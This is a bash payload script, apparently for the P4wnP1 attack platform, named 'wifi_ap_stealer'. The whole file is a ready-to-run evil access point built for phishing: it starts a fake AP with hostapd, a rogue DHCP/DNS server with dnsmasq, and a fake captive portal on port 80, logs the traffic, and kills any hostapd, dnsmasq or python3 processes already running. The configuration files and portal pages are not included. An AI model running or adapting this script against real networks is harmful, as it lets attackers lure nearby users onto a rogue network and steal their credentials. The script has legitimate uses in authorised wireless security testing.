#!/bin/bash
# payloads/network/wifi_ap_stealer.sh

### Description: Evil AP with captive portal for phishing
### Requirements: hostapd, dnsmasq, lighttpd or Python HTTP server

PAYLOAD_NAME="wifi_ap_stealer"
HOSTAPD_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_hostapd.conf"
DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"
WEB_ROOT="/opt/p4wnp1/www"
LOG_DIR="/opt/p4wnp1/logs"

mkdir -p "$LOG_DIR"
mkdir -p "$WEB_ROOT"

pkill hostapd || true
pkill dnsmasq || true
pkill python3 || true

if [ ! -f "$HOSTAPD_CONF" ]; then
  echo "[!] Missing hostapd config: $HOSTAPD_CONF"
  exit 1
fi

if [ ! -f "$DNSMASQ_CONF" ]; then
  echo "[!] Missing dnsmasq config: $DNSMASQ_CONF"
  exit 1
fi

# Start fake AP
hostapd "$HOSTAPD_CONF" &

# Start rogue DHCP/DNS
sleep 2
dnsmasq --conf-file="$DNSMASQ_CONF" --log-facility="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log" &

# Start fake captive portal
cd "$WEB_ROOT"
python3 -m http.server 80 > "$LOG_DIR/${PAYLOAD_NAME}_web.log" 2>&1 &

echo "[+] Evil AP running. Logs in $LOG_DIR"
exit 0
